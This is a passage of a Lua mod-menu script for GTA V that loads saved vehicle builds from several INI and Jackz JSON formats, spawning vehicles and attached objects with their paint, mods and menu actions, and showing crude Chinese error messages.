        local v_mods = data['Vehicle Mods']
        local v_extras = data['Vehicle Extras']
        local v_toggles = data['Vehicle Toggles']
        local data = data.Vehicle 
        WIRI_VEHICLE.SET_VEHICLE_COLOURS(vehicle, data['primary paint'] or 0, data['secondary paint'] or 0)
        WIRI_VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data['tyre smoke red'] or 0, data['tyre smoke green'] or 0, data['tyre smoke blue'] or 0)
        WIRI_VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data['neon red'] or 0, data['neon green'] or 0, data['neon blue'] or 0)
        WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        WIRI_VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data['dirt level'] or 0)
        --WIRI_VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        WIRI_VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data['wheel type'] or 0)
        WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data['pearlescent colour'] or 0, data['wheel colour'] or 0)
        WIRI_VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data['window tint'] or 0)
        WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, data['plate index'] or 0)

        if data['bulletproof tyres'] == 1 then 
            WIRI_VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end

        for i=1, 4 do 
            if data['neon ' .. i] == 1 then 
                WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i= 1, 7 do 
            if data['door ' .. i .. ' state'] == 1 then
                WIRI_VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i, false, true)
            end
        end

        for i=0, 48 do
            if v_mods[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods[i], false)
            end
        end

        for i=1, 9 do 
            WIRI_VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if v_extras[i] == 0 then true else false)
        end

        for i=17, 22 do 
            WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if v_toggles[i] == 1 then true else false)
        end

    elseif ini_type == 3 then
        WIRI_VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.PrimaryPaint or 0, data.SecondaryPaint or 0)
        if data.PrimaryPaint == -1 then 
            WIRI_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, data.PrimaryR or 0, data.PrimaryG or 0, data.PrimaryB or 0)
        end 
        if data.SecondaryPaint == -1 then 
            WIRI_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, data.SecondaryR, data.SecondaryG, data.SecondaryB)
        end
        WIRI_VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, data.PrimaryPaintT or 0, data.PrimaryPaint or 0, data.Pearlescent or 0)
        WIRI_VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, data.SecondaryPaintT or 0, data.SecondaryPaint or 0)
        WIRI_VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        WIRI_VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --WIRI_VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        WIRI_VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        WIRI_VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearlescent or 0, data.WheelsColor or 0)
        WIRI_VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.WindowTint or 0)
        WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, data.DashColor)
        WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, data.DashLightColor)

        if data.BulletProof == 1 then 
            WIRI_VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        if data.NeonEnabled == 1 then
            for i=1, 4 do 
                WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i=0, 48 do
            if data[i] ~= nil then 
                WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], data.CustomTyres)
            end
        end

        for i=17, 22 do 
            WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if data['TOGGLE_' .. i] == 1 then true else false)
        end

        for i=1, 9 do 
            WIRI_VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['Extra_' .. i] == 0 then true else false)
        end

    elseif ini_type == 4 then 
        util.toast("这个INI只仅部分支持.如果模组看起来很奇怪或者有些东西不见了，那就没办法了铁铁.")
        local v_root = data['Vehicle' .. veh_index]
        local v_mods = data['Vehicle' .. veh_index .. "Mods"]
        local v_extras = data['Vehicle' .. veh_index .. "Extras"]
        local v_toggles = data['Vehicle' .. veh_index .. "Toggles"]
        local v_smoke = data['Vehicle' .. veh_index .. "TireSmoke"]
        local v_neon = data['Vehicle' .. veh_index .. "Neon"]
        local v_neon_color = data['Vehicle' .. veh_index .. "NeonColor"]
        local v_paintfade = data['Vehicle' .. veh_index .. "PaintFade"]
        local v_color_main = data['Vehicle' .. veh_index .. "VehicleColors"]
        local v_color_extra = data['Vehicle' .. veh_index .. "ExtraColors"]
        local v_color_custom_p = data['Vehicle' .. veh_index .. "CustomPrimaryColor"]
        local v_color_custom_s = data['Vehicle' .. veh_index .. "CustomSecondaryColor"]
        local v_wheel_type = data['Vehicle' .. veh_index .. "WheelType"]
        local v_plate = data['Vehicle' .. veh_index .. "Numberplate"]
        local v_window_tint = data['Vehicle' .. veh_index .. "WindowTint"]
        local v_is_custom_primary = data['Vehicle' .. veh_index .. "IsCustomPrimary"]
        local v_is_custom_secondary = data['Vehicle' .. veh_index .. "IsCustomSecondary"]
        local data = data['Vehicle' .. veh_index]

        for i=0, 49 do
            if data['M' .. tostring(i)] ~= nil then 
                WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods['M' .. i], false)
            end
        end

        for i=0, 49 do 
            WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, v_toggles['T' .. i])
        end

        for i=1, 13 do 
            WIRI_VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, v_extras['E' .. i])
        end

        for i=1, 4 do 
            WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, v_neon["Enabled" .. i])
        end

        ENTITY.SET_ENTITY_DYNAMIC(vehicle, v_root.Dynamic)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, v_root.Visible, 0)
        WIRI_VEHICLE.SET_VEHICLE_COLOURS(vehicle, v_color_main.Primary or 0, v_color_main.Secondary or 0)
        if v_is_custom_primary['bool'] then 
            WIRI_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(v_color_custom_p.r or 0, v_color_custom_p.g or 0, v_color_custom_p.b or 0)
        end

        if v_is_custom_secondary['bool'] then 
            WIRI_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(v_color_custom_s.r or 0, v_color_custom_s.g or 0, v_color_custom_s.b or 0)
        end

        WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, v_color_extra.Pearl or 0, v_color_extra.Wheel or 0)

    
        WIRI_VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, v_smoke.R or 0, v_smoke.G or 0, v_smoke.B or 0)
        WIRI_VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, v_neon_color.R or 0, v_neon_color.G or 0, v_neon_color.B or 0)
        WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --WIRI_VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        WIRI_VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, v_paintfade.PaintFade or 0)
        WIRI_VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, v_wheel_type or 0)
        WIRI_VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, v_window_tint or 0)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, v_root.Invincible or false)
        ENTITY.SET_ENTITY_HAS_GRAVITY(vehicle, v_root.Gravity or true)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, v_root.Freeze or false)
        ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicle, v_root.ScorchedRender or false)
        ENTITY.SET_ENTITY_ALPHA(vehicle, v_root.Alpha or 255, false) 
        WIRI_VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, v_root.Dirt or 0.0) 
        WIRI_VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, v_root.IsEngineOn, true, false)
        WIRI_VEHICLE.SET_VEHICLE_LIGHT_MULTIPLIER(vehicle, v_root.HeadlightMultiplier or 1.0)
    end
end

function tprint (tbl, indent)
    if not indent then indent = 0 end
    for k, v in pairs(tbl) do
      formatting = string.rep("  ", indent) .. k .. ": "
      if type(v) == "table" then
        print(formatting)
        tprint(v, indent+1)
      elseif type(v) == 'boolean' then
        print(formatting .. tostring(v))      
      else
        print(formatting .. v)
      end
    end
  end

function ini_load_vehicle(file_name)
    local data
    success, data = pcall(iniparser.parse, file_name, vehicles_dir)
    if not success then 
        util.toast("加载他妈的这个INI时出现了致命错误!请检查INI文件，然后再你妈的重试. ")
    end
    local all_entities = {}
    local ini_type = -1
    -- determine type of ini file 
    -- type 1 has no spaces in it (i.e Airship.xml). 
    -- type 2 does and has  lowercase shit (420 Hydra.ini). it's also extremely stupid
    -- type 3 is extremely similar to type 1, but has values like PrimaryPaintT (BayWatch Blazer.xml)
    -- type 4 has an "AllObjects", "AllPeds", "AllVehicles" section in the ini (4tire_bike.ini)
    -- type 5 has AllObjects and AllVehicles (Boat-fsx.ini) (seems like theres an iniparser glitch in this one)
    -- type 6 is like type 2, but some keys are different, namely the numbers for attachments are called "Attached Object x" (Tankamid.ini)

    if data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT == nil and data.AllVehicles.Count == nil then 
        ini_type = 1
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model == nil then 
        ini_type = 2
    elseif data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT ~= nil then 
        ini_type = 3
    elseif data.AllObjects.Count ~= nil and data.AllVehicles.Count ~= nil and data.AllPeds.Count ~= nil then 
        ini_type = 4
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model ~= nil then 
        ini_type = 6
    end


    if ini_type == -1 then
        util.toast("不支持此INI类型! 傻逼滚 :(")
        return
    end
    -- there is also an ini type 6...
    local initial_vehicle
    local v_count = 1
    local success = false
    if ini_type == 1 then 
        local v_hash = data['Vehicle']['Model']
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data['Vehicle'], ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, here['Bone'], here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, if here['Collision'] == 1 then true else false, true, false, 2, true)
                if here['Froozen'] == 1 then 
                    ENTITY.FREEZE_ENTITY_POSITION(this_ent, true)
                end

                if here['Lit'] == 1 then 
                    FIRE.START_ENTITY_FIRE(this_ent)
                end
                attachment_index = attachment_index + 1
            end
        end
    elseif ini_type == 2 then
        local v_hash = data.Vehicle.model
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x'], here['y'], here['z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end

    elseif ini_type == 3 then
        local v_hash = data.Vehicle.Model
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data.Vehicle, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    
    elseif ini_type == 4 then 
        local numerations = {}
        local attachments_data = {}
        local veh_index = 0
        local object_index = 0 
        local ped_index = 0
        while true do
            if data['Vehicle' .. tostring(veh_index)].Hash == nil then 
                success = true
                break
            end
            local here = data['Vehicle' .. tostring(veh_index)]
            if here.Hash == nil then 
                util.toast(fail_text)
                return
            end
            request_model_load(here.Hash)
            local this_vehicle = entities.create_vehicle(here.Hash, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            if veh_index == 0 then 
                initial_vehicle = this_vehicle
            end
            numerations[here.SelfNumeration] = this_vehicle
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_vehicle, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_vehicle
            ini_preprocess_vehicle(this_vehicle, data, ini_type, veh_index)
            veh_index = veh_index + 1
        end

        while true do
            if data['Object' .. tostring(object_index)].Hash == nil then 
                success = true
                break
            end
            local here = data['Object' .. tostring(object_index)]
            request_model_load(here.Hash)
            local this_object = entities.create_object(here.Hash, players.get_position(players.user()))
            numerations[here.SelfNumeration] = this_object
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_object, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_object
            ENTITY.SET_ENTITY_DYNAMIC(veh, here.Dynamic)
            ENTITY.SET_ENTITY_VISIBLE(veh, here.Visible) 
            ENTITY.SET_ENTITY_HAS_GRAVITY(veh, here.Gravity)
            ENTITY.FREEZE_ENTITY_POSITION(veh, here.Freeze)
            object_index = object_index + 1
        end

        for k,v in pairs(attachments_data) do
            if v.attachee ~= nil and numerations[v.attached_to] ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(v.attachee, numerations[v.attached_to], v.Bone, v.x, v.y, v.z, v.pitch, v.roll, v.yaw, true, false, v.collision, false, 2, true)
            end
        end

    elseif ini_type == 6 then 
        local v_hash = data.Vehicle.model
        local c = players.get_position(players.user())
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 1
        while true do 
            if data['Attached Object ' .. tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data['Attached Object ' .. tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x offset'], here['y offset'], here['z offset'], here['pitch'], here['roll'], here['yaw'], true, false, if here['collision'] == 1 then true else false, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    end

    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, file_name, {"lancespoonerv" .. initial_vehicle}, "")

        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)

        menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)

        menu.action(this_veh_root, "传送至载具内", {"teleportemenyoov" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)

    else
        util.toast(fail_text)
    end
end

function json_preprocess_vehicle(vehicle, data, initial_vehicle)
    local sd = data.savedata
    local mods = sd.Mods
    if vehicle ~= initial_vehicle then
        if data.data ~= nil then 
            -- for the updated edition
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.data.visible, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.data.godmode)
        else
            if sd.godmode ~= nil then
                ENTITY.SET_ENTITY_INVINCIBLE(vehicle, sd.godmode)
            end
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    else
        if data.godmode ~= nil then
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.godmode)
        end
        if data.visible ~= nil then
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    end

    if vehicle ~= initial_vehicle then 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle, initial_vehicle, 0, data.offset.x, data.offset.y, data.offset.z, data.rotation.x, data.rotation.y, data.rotation.z, true, false, true, false, 2, true)
    end

    -- for some reason jackz used the name of the mod instead of the mod index / mod type lol
    -- otherwise, this code couldve taken up just 3 lines
    -- not like i couldnt have used a table, but still, come on...
    WIRI_VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, sd['Tire Smoke'].r, sd['Tire Smoke'].g, sd['Tire Smoke'].b)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 0, mods['Spoilers'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 1, mods['Ornaments'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 2, mods['Front Bumper'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 3, mods['Side Skirt'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 4, mods['Exhaust'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 5, mods['Frame'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 6, mods['Grille'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 7, mods['Hood'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 8, mods['Fender'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 9, mods['Right Fender'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 10, mods['Roof'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 11, mods['Engine'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 12, mods['Brakes'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 13, mods['Transmission'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 14, mods['Horns'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 15, mods['Suspension'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 16, mods['Armor'], false)
    -- no front wheels in spec? lol?
    --WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 23, mods['Front Wheels'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 24, mods["Motorcycle Back Wheel Design"], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 25, mods['Plate Holders'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 27, mods['Trim Design'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 30, mods['Dial Design'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 33, mods['Steering Wheel'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 34, mods['Shifter Leavers'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 35, mods['Plaques'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 36, mods['Hydraulics'], false)
    WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, 48, mods['Livery'], false)

    -- toggle 
    WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 17, mods.Toggles.UNK17)
    -- typo here in the jackz json spec btw, not my fault :|
    WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, mods.Toggles['Turbo Turning'])
    WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 19, mods.Toggles['UNK19'])
    WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, mods.Toggles['Tire Smoke'])
    WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 21, mods.Toggles['UNK21'])
    WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, mods.Toggles['Xenon Headlights'])
    -------
    WIRI_VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, not sd['Bulletproof Tires'])
    WIRI_VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, sd['Dirt Level'])
    WIRI_VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, sd['Window Tint'])
    WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, sd['Dashboard Color'])
    for i=10, 11 do 
        WIRI_VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, not sd.Extras[i])
    end
    -- lights
    WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, sd['Interior Color'])
    WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 0, sd.Lights.Neon.Left)
    WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 1, sd.Lights.Neon.Right)
    WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 2, sd.Lights.Neon.Front)
    WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 3, sd.Lights.Neon.back)
    WIRI_VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, sd.Lights.Neon.Color.r, sd.Lights.Neon.Color.g, sd.Lights.Neon.Color.b) 
    WIRI_VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, sd.Lights['Xenon Color'])
    WIRI_VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, sd['Engine Running'], true, false) 
    -- colors 
    local colors = sd.Colors
    -- why is there a custom rgb color in the "vehicle" colors but also in both primary and secondary fields? what is the point?
    WIRI_VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors.Vehicle.Primary, colors.Vehicle.Secondary)
    if colors.Primary.Custom then 
        WIRI_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colors.Primary['Custom Color'].r, colors.Primary['Custom Color'].g, colors.Primary['Custom Color'].b)
    end
    if colors.Secondary.Custom then 
        WIRI_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colors.Secondary['Custom Color'].r, colors.Secondary['Custom Color'].g, colors.Secondary['Custom Color'].b)
    end
    WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors.Extras.pearlescent, colors.Extras.wheel)
    WIRI_VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, colors['Paint Fade'])
    WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
end

local supported_jackz_versions = {'1.1.0', '1.3.0', '1.3.1', '1.4.0'}
function json_load_vehicle(path)
    local all_entities = {}
    local success = false
    local fp = io.open(path, "r")
    if not fp then 
        util.toast("打开错误了 他妈的 " .. path)
        return
    end
    local json_string = fp:read("*all")
    local json_tbl = lunajson.decode(json_string)
    if json_tbl.version ~= nil then 
        local disp_version = string.gsub(json_tbl.version, 'Jackz自定义载具 ', '')
        if not table.contains(supported_jackz_versions, disp_version) then 
            util.toast("兰斯Spooner不支持这个Jackz或JSON版本 (版本 " .. disp_version .. "). 正在加载此文件，有可能正常使用.如果此模组显示正常，请告诉我，已便我可以减少这类提示!")
        end
    else
        util.toast("这辆Jackz载具多久了你他妈还在用(或者这他妈就不是Jackz载具). 在尝试了 可能会失败哦.")
    end
    local base = json_tbl.base
    if base.model == nil then 
        util.toast(fail_text)
        return
    end
    local v_hash = base.model
    request_model_load(v_hash)
    local c = players.get_position(players.user())
    local initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
    all_entities[#all_entities + 1] = initial_vehicle
    json_preprocess_vehicle(initial_vehicle, base, initial_vehicle)

    for k,o in pairs(json_tbl.objects) do 
        request_model_load(o.model)
        local this_obj = entities.create_object(o.model, c)
        all_entities[#all_entities + 1] = this_obj
        ENTITY.SET_ENTITY_VISIBLE(this_obj, o.visible, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(this_obj, initial_vehicle, 0, o.offset.x, o.offset.y, o.offset.z, o.rotation.x, o.rotation.y, o.rotation.z, true, false, true, false, 2, true)
    end

    if json_tbl.vehicles ~= nil then 
        for k,veh in pairs(json_tbl.vehicles) do 
            local v_hash = veh.model
            request_model_load(v_hash)
            local this_veh = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            all_entities[#all_entities + 1] = this_veh
            json_preprocess_vehicle(this_veh, veh, initial_vehicle)
        end
    end

    success = true 
    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir, ''), {"lancespoonerv" .. initial_vehicle}, "")
        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)

        menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)

        menu.action(this_veh_root, "传送至载具内", {"teleportejsonv" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)

    else
        util.toast("发生了他妈的错误!这个JSON不能加载.滚 :'(")
    end
end

--拓展选项
CCAM = 0
STP_SPEED_MODIFIER = 0.02
STP_COORD_HEIGHT = 300

FRAME_STP = false

--preload
DR_TXT_SCALE = 0.5

--preload
EP_drawveh = true
EP_drawped = true
EP_drawobj = true
EP_drawpick = true
----
EPS_vehx = 0.0
EPS_vehy = 0.03
--
EPS_pedx = 0.0
EPS_pedy = 0.05
--
EPS_objx = 0.0
EPS_objy = 0.07
--
EPS_pickx = 0.0
EPS_picky = 0.09
--

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

function onStartup()
    SE_LocalPed = GetLocalPed()
end

onStartup()


local function request_ptfx_asset_firework(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

local placed_firework_boxes = {}

function placefirework()
    local animlib = 'anim@mp_fireworks'
    local ptfx_asset = "scr_indep_fireworks"
    local anim_name = 'place_firework_3_box'
    local effect_name = "scr_indep_firework_trailburst"
